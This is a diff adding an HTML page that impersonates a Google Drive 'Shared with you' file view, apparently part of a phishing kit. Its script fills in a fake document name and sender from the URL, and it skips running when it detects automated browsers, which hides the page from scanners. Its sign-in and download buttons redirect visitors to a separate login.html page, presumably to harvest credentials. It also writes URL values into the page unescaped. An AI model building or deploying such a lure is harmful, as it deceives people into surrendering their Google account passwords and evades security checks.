@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title id="pg-title">Shared with you – Google Drive</title>
+<!-- Google Drive favicon -->
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 87 78'%3E%3Cpath d='M6.2 66.3l4.2 7.3c.9 1.5 2.1 2.7 3.5 3.6L27.4 55H0c0 1.7.4 3.4 1.3 4.9l4.9 8.4z' fill='%230066DA'/%3E%3Cpath d='M43.5 25L30 2.8c-1.4.9-2.6 2.1-3.5 3.6L1.3 50.1C.4 51.6 0 53.3 0 55h27.4L43.5 25z' fill='%2300AC47'/%3E%3Cpath d='M72.8 77.2c1.4-.9 2.6-2.1 3.5-3.6l1.7-2.9 8.1-14c.9-1.5 1.3-3.2 1.3-4.9H60l5.8 11.7 7 13.7z' fill='%23EA4335'/%3E%3Cpath d='M43.5 25l13.5-22.2C55.6 1.9 53.6 1.4 51.6 1.4H35.4c-2 0-4 .5-5.4 1.4L43.5 25z' fill='%2300832D'/%3E%3Cpath d='M60.6 55H27.4l-13.5 22.2c1.4.9 3 1.4 4.6 1.4h51c1.6 0 3.2-.5 4.6-1.4L60.6 55z' fill='%232684FC'/%3E%3Cpath d='M72.6 27.5L58.8 3.6c-.9-1.5-2.1-2.7-3.5-3.6L41.8 22.2 60 55h26.7C86.7 53.3 86.3 51.6 85.4 50.1l-12.8-22.6z' fill='%23FFBA00'/%3E%3C/svg%3E">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html{font-family:'Google Sans','Roboto','Helvetica Neue',Arial,sans-serif;font-size:14px;background:#fff;color:#202124}
+body{min-height:100vh;display:flex;flex-direction:column}
+
+/* ── Header ── */
+header{background:#fff;border-bottom:1px solid #e0e0e0;height:64px;padding:0 24px;display:flex;align-items:center;gap:8px;flex-shrink:0}
+.g-logo{display:flex;align-items:center;gap:8px;text-decoration:none;color:inherit}
+.g-logo-text{font-size:22px;color:#5f6368;font-weight:400;letter-spacing:-.5px}
+.g-logo-text span{color:#5f6368}
+.hdr-right{margin-left:auto;display:flex;align-items:center;gap:8px}
+.hdr-apps{width:36px;height:36px;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:background .15s}
+.hdr-apps:hover{background:#f1f3f4}
+.hdr-avatar{width:32px;height:32px;border-radius:50%;background:#1a73e8;color:#fff;font-size:13px;font-weight:500;display:flex;align-items:center;justify-content:center;cursor:pointer}
+
+/* ── Viewer toolbar ── */
+.toolbar{background:#f8f9fa;border-bottom:1px solid #e0e0e0;padding:0 16px;height:48px;display:flex;align-items:center;gap:8px}
+.toolbar-title{font-size:14px;color:#202124;font-weight:500;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.toolbar-owner{font-size:12px;color:#5f6368;margin-left:4px;font-weight:400}
+.tb-btn{display:inline-flex;align-items:center;gap:6px;border:none;background:#1a73e8;color:#fff;border-radius:4px;padding:0 16px;height:32px;font-size:13px;font-family:inherit;font-weight:500;cursor:pointer;transition:background .15s,box-shadow .15s;text-decoration:none}
+.tb-btn:hover{background:#1557b0;box-shadow:0 1px 2px rgba(0,0,0,.3)}
+.tb-btn-secondary{background:#fff;color:#1a73e8;border:1px solid #dadce0;margin-right:4px}
+.tb-btn-secondary:hover{background:#f8f9fa;box-shadow:0 1px 2px rgba(0,0,0,.1)}
+
+/* ── Preview area ── */
+.preview-area{flex:1;background:#f1f3f4;display:flex;align-items:center;justify-content:center;padding:40px 20px;min-height:300px;position:relative}
+.preview-card{background:#fff;border-radius:8px;box-shadow:0 1px 2px rgba(0,0,0,.1),0 4px 12px rgba(0,0,0,.1);max-width:560px;width:100%;overflow:hidden}
+.preview-header{padding:24px 32px 20px;border-bottom:1px solid #e0e0e0;display:flex;align-items:flex-start;gap:16px}
+.preview-doc-icon{flex-shrink:0}
+.preview-doc-info h2{font-size:18px;color:#202124;font-weight:500;margin-bottom:4px;line-height:1.3}
+.preview-doc-info p{font-size:13px;color:#5f6368}
+.preview-lock{padding:32px;text-align:center}
+.lock-icon{width:64px;height:64px;margin:0 auto 16px;background:#e8f0fe;border-radius:50%;display:flex;align-items:center;justify-content:center}
+.preview-lock h3{font-size:16px;color:#202124;margin-bottom:8px;font-weight:500}
+.preview-lock p{font-size:14px;color:#5f6368;margin-bottom:24px;line-height:1.5;max-width:320px;margin-left:auto;margin-right:auto}
+.preview-lock .g-signin-btn{display:inline-flex;align-items:center;gap:10px;border:1px solid #dadce0;background:#fff;color:#3c4043;border-radius:4px;padding:0 20px;height:40px;font-size:14px;font-family:inherit;cursor:pointer;transition:box-shadow .15s,background .15s;text-decoration:none}
+.preview-lock .g-signin-btn:hover{box-shadow:0 1px 3px rgba(0,0,0,.2);background:#f8f9fa}
+.preview-lock .g-signin-btn-primary{background:#1a73e8;color:#fff;border-color:#1a73e8;margin-left:8px}
+.preview-lock .g-signin-btn-primary:hover{background:#1557b0;box-shadow:0 1px 3px rgba(0,0,0,.3)}
+
+/* ── Sender info strip ── */
+.sender-strip{background:#fff;border-top:1px solid #e0e0e0;padding:16px 32px;display:flex;align-items:center;gap:12px}
+.s-avatar{width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:600;color:#fff;flex-shrink:0;text-transform:uppercase}
+.s-info{flex:1}
+.s-info .s-name{font-size:13px;color:#202124;font-weight:500}
+.s-info .s-detail{font-size:11px;color:#5f6368}
+.s-time{font-size:11px;color:#5f6368;white-space:nowrap}
+
+/* ── Footer ── */
+footer{padding:12px 24px;border-top:1px solid #e0e0e0;display:flex;flex-wrap:wrap;gap:16px;align-items:center;background:#fff}
+footer a{font-size:12px;color:#5f6368;text-decoration:none}
+footer a:hover{text-decoration:underline}
+
+.hp{position:absolute;left:-9999px;opacity:0;pointer-events:none}
+
+/* ── Overlay ── */
+.ov{position:fixed;inset:0;background:#fff;z-index:999;display:none;flex-direction:column;align-items:center;justify-content:center;gap:16px}
+.ov.on{display:flex}
+.g-sp{width:40px;height:40px;border:3px solid #e8f0fe;border-top-color:#1a73e8;border-radius:50%;animation:spin .8s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.ov p{font-size:14px;color:#5f6368}
+</style>
+</head>
+<body>
+
+<header>
+  <a class="g-logo" href="#" onclick="return false">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 87 78" width="28" height="24">
+      <path d="M6.2 66.3l4.2 7.3c.9 1.5 2.1 2.7 3.5 3.6L27.4 55H0c0 1.7.4 3.4 1.3 4.9l4.9 8.4z" fill="#0066DA"/>
+      <path d="M43.5 25L30 2.8c-1.4.9-2.6 2.1-3.5 3.6L1.3 50.1C.4 51.6 0 53.3 0 55h27.4L43.5 25z" fill="#00AC47"/>
+      <path d="M72.8 77.2c1.4-.9 2.6-2.1 3.5-3.6l1.7-2.9 8.1-14c.9-1.5 1.3-3.2 1.3-4.9H60l5.8 11.7 7 13.7z" fill="#EA4335"/>
+      <path d="M43.5 25l13.5-22.2C55.6 1.9 53.6 1.4 51.6 1.4H35.4c-2 0-4 .5-5.4 1.4L43.5 25z" fill="#00832D"/>
+      <path d="M60.6 55H27.4l-13.5 22.2c1.4.9 3 1.4 4.6 1.4h51c1.6 0 3.2-.5 4.6-1.4L60.6 55z" fill="#2684FC"/>
+      <path d="M72.6 27.5L58.8 3.6c-.9-1.5-2.1-2.7-3.5-3.6L41.8 22.2 60 55h26.7C86.7 53.3 86.3 51.6 85.4 50.1l-12.8-22.6z" fill="#FFBA00"/>
+    </svg>
+    <span class="g-logo-text">Drive</span>
+  </a>
+  <div class="hdr-right">
+    <div class="hdr-apps">
+      <svg width="18" height="18" viewBox="0 0 18 18" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="3" cy="3" r="1.5" fill="#5f6368"/><circle cx="9" cy="3" r="1.5" fill="#5f6368"/><circle cx="15" cy="3" r="1.5" fill="#5f6368"/>
+        <circle cx="3" cy="9" r="1.5" fill="#5f6368"/><circle cx="9" cy="9" r="1.5" fill="#5f6368"/><circle cx="15" cy="9" r="1.5" fill="#5f6368"/>
+        <circle cx="3" cy="15" r="1.5" fill="#5f6368"/><circle cx="9" cy="15" r="1.5" fill="#5f6368"/><circle cx="15" cy="15" r="1.5" fill="#5f6368"/>
+      </svg>
+    </div>
+  </div>
+</header>
+
+<div class="toolbar">
+  <div class="toolbar-title" id="tb-title">Document<span class="toolbar-owner" id="tb-owner"></span></div>
+  <a href="#" class="tb-btn tb-btn-secondary" onclick="goSignIn();return false">
+    <svg width="14" height="14" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M8 1v9M4 7l4 4 4-4M2 12v2h12v-2" stroke="#1a73e8" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+    </svg>
+    Download
+  </a>
+  <a href="#" class="tb-btn" onclick="goSignIn();return false">
+    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M12 3c-4.97 0-9 4.03-9 9s4.03 9 9 9 9-4.03 9-9-4.03-9-9-9zm-1 5v4l3.25 2.03-.81 1.34L10 13V8h1z" fill="white"/>
+    </svg>
+    Open with Google Docs
+  </a>
+</div>
+
+<div class="preview-area">
+  <div class="preview-card">
+    <div class="preview-header">
+      <div class="preview-doc-icon" id="doc-icon"><!-- JS rendered --></div>
+      <div class="preview-doc-info">
+        <h2 id="doc-title">Document</h2>
+        <p id="doc-subtitle">Google Document · Shared with you</p>
+      </div>
+    </div>
+    <div class="preview-lock">
+      <div class="lock-icon">
+        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <rect x="5" y="11" width="14" height="11" rx="2" fill="#1a73e8"/>
+          <path d="M8 11V7a4 4 0 0 1 8 0v4" stroke="#1a73e8" stroke-width="2" stroke-linecap="round"/>
+          <circle cx="12" cy="16" r="1.5" fill="white"/>
+        </svg>
+      </div>
+      <h3>Sign in to view this file</h3>
+      <p id="lock-desc">You need a Google Account to view this document. The owner has shared it with you but you must sign in first.</p>
+      <div>
+        <a href="https://accounts.google.com" target="_blank" class="g-signin-btn">
+          <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 48 48">
+            <path d="M44.5 20H24v8.5h11.8C34.7 33.9 30.1 37 24 37c-7.2 0-13-5.8-13-13s5.8-13 13-13c3.1 0 5.9 1.1 8.1 2.9l6.4-6.4C34.6 4.1 29.6 2 24 2 11.8 2 2 11.8 2 24s9.8 22 22 22c11 0 21-8 21-22 0-1.3-.2-2.7-.5-4z" fill="#FFC107"/>
+            <path d="M6.3 14.7l7.1 5.2C15.1 16.1 19.2 13 24 13c3.1 0 5.9 1.1 8.1 2.9l6.4-6.4C34.6 4.1 29.6 2 24 2 16.3 2 9.7 7.3 6.3 14.7z" fill="#FF3D00"/>
+            <path d="M24 46c5.5 0 10.5-2.1 14.3-5.4l-6.6-5.6C29.6 36.9 26.9 38 24 38c-6 0-10.8-4-12.1-9.4l-7.1 5.6C7.6 41.7 15.2 46 24 46z" fill="#4CAF50"/>
+            <path d="M44.5 20H24v8.5h11.8c-.5 2.4-2 4.5-4 6l6.6 5.6C41.7 37 44.5 31 44.5 24c0-1.3-.2-2.7-.5-4z" fill="#1976D2"/>
+          </svg>
+          View only
+        </a>
+        <a href="#" class="g-signin-btn g-signin-btn-primary" onclick="goSignIn();return false">
+          <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 48 48">
+            <path d="M44.5 20H24v8.5h11.8C34.7 33.9 30.1 37 24 37c-7.2 0-13-5.8-13-13s5.8-13 13-13c3.1 0 5.9 1.1 8.1 2.9l6.4-6.4C34.6 4.1 29.6 2 24 2 11.8 2 2 11.8 2 24s9.8 22 22 22c11 0 21-8 21-22 0-1.3-.2-2.7-.5-4z" fill="white"/>
+          </svg>
+          Sign in with Google
+        </a>
+      </div>
+    </div>
+    <div class="sender-strip">
+      <div class="s-avatar" id="s-avatar">?</div>
+      <div class="s-info">
+        <div class="s-name" id="s-name">Someone shared this with you</div>
+        <div class="s-detail" id="s-detail">via Google Drive</div>
+      </div>
+      <div class="s-time" id="s-time">Just now</div>
+    </div>
+  </div>
+
+  <input class="hp" type="text" name="workspace" tabindex="-1" autocomplete="off">
+</div>
+
+<footer>
+  <a href="https://policies.google.com/privacy" target="_blank">Privacy</a>
+  <a href="https://policies.google.com/terms" target="_blank">Terms</a>
+  <a href="https://support.google.com/drive" target="_blank">Help</a>
+</footer>
+
+<div class="ov" id="ov">
+  <svg xmlns="http://www.w3.org/2000/svg" width="40" height="34" viewBox="0 0 87 78">
+    <path d="M6.2 66.3l4.2 7.3c.9 1.5 2.1 2.7 3.5 3.6L27.4 55H0c0 1.7.4 3.4 1.3 4.9l4.9 8.4z" fill="#0066DA"/>
+    <path d="M43.5 25L30 2.8c-1.4.9-2.6 2.1-3.5 3.6L1.3 50.1C.4 51.6 0 53.3 0 55h27.4L43.5 25z" fill="#00AC47"/>
+    <path d="M72.8 77.2c1.4-.9 2.6-2.1 3.5-3.6l1.7-2.9 8.1-14c.9-1.5 1.3-3.2 1.3-4.9H60l5.8 11.7 7 13.7z" fill="#EA4335"/>
+    <path d="M60.6 55H27.4l-13.5 22.2c1.4.9 3 1.4 4.6 1.4h51c1.6 0 3.2-.5 4.6-1.4L60.6 55z" fill="#2684FC"/>
+    <path d="M72.6 27.5L58.8 3.6c-.9-1.5-2.1-2.7-3.5-3.6L41.8 22.2 60 55h26.7C86.7 53.3 86.3 51.6 85.4 50.1l-12.8-22.6z" fill="#FFBA00"/>
+  </svg>
+  <p>Connecting to Google…</p>
+</div>
+
+<script>
+(function(){
+  var sp      = new URLSearchParams(location.search);
+  var rawDoc  = sp.get('doc')  || sp.get('file') || 'Project Proposal';
+  var rawFrom = sp.get('from') || 'Your colleague';
+  var rawType = (sp.get('type') || 'doc').toLowerCase();
+  var rawOrg  = sp.get('org')  || '';
+
+  /* ── Bot check ── */
+  if (navigator.webdriver || window.callPhantom || window._phantom) return;
+
+  /* ── Type detection ── */
+  var types = {
+    doc:   { label:'Google Docs',       color:'#4285f4', letter:'G' },
+    sheet: { label:'Google Sheets',     color:'#34a853', letter:'G' },
+    slide: { label:'Google Slides',     color:'#ea4335', letter:'G' },
+    form:  { label:'Google Forms',      color:'#673ab7', letter:'G' },
+    pdf:   { label:'PDF Document',      color:'#d93025', letter:'PDF' },
+    docx:  { label:'Word Document',     color:'#2b579a', letter:'W' },
+    xlsx:  { label:'Excel Spreadsheet', color:'#217346', letter:'X' },
+  };
+  // Detect from file extension too
+  var ext = (rawDoc.match(/\.(\w+)$/) || ['',''])[1].toLowerCase();
+  var typeKey = rawType !== 'doc' ? rawType : (ext || 'doc');
+  var ft = types[typeKey] || types['doc'];
+
+  /* ── Icons ── */
+  var docIconHtml = '<svg width="48" height="48" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg"><rect width="48" height="48" rx="4" fill="' + ft.color + '"/><text x="24" y="31" font-family="Google Sans,Roboto,Arial,sans-serif" font-size="' + (ft.letter.length > 1 ? '14' : '26') + '" font-weight="700" fill="white" text-anchor="middle">' + ft.letter + '</text></svg>';
+  document.getElementById('doc-icon').innerHTML = docIconHtml;
+
+  /* ── Populate ── */
+  var displayName = rawDoc.replace(/\.\w+$/, '');
+  document.getElementById('pg-title').textContent = displayName + ' – Google Drive';
+  document.getElementById('tb-title').innerHTML = displayName + (rawFrom ? '<span class="toolbar-owner"> — ' + rawFrom + '</span>' : '');
+  document.getElementById('doc-title').textContent = displayName;
+  document.getElementById('doc-subtitle').textContent = ft.label + ' · Shared with you';
+  document.getElementById('lock-desc').textContent = rawFrom + ' shared "' + displayName + '" with you. Sign in with your Google Account to open and edit.';
+
+  // Sender
+  var avEl = document.getElementById('s-avatar');
+  avEl.textContent = (rawFrom[0]||'?').toUpperCase();
+  var avColors = ['#1a73e8','#34a853','#ea4335','#fbbc04','#673ab7'];
+  avEl.style.background = avColors[rawFrom.charCodeAt(0) % avColors.length];
+  document.getElementById('s-name').textContent = rawFrom + ' shared this with you';
+  if (rawOrg) document.getElementById('s-detail').textContent = 'from ' + rawOrg + ' · via Google Drive';
+
+  var times = ['Just now','2 minutes ago','12 minutes ago','1 hour ago'];
+  document.getElementById('s-time').textContent = times[rawFrom.length % times.length];
+
+  /* ── Sign in ── */
+  window.goSignIn = function() {
+    document.getElementById('ov').classList.add('on');
+    setTimeout(function(){
+      location.href = 'login.html?service=google&ctx=gdrive&_t=' + Date.now();
+    }, 1600);
+  };
+})();
+</script>
+</body>
+</html>
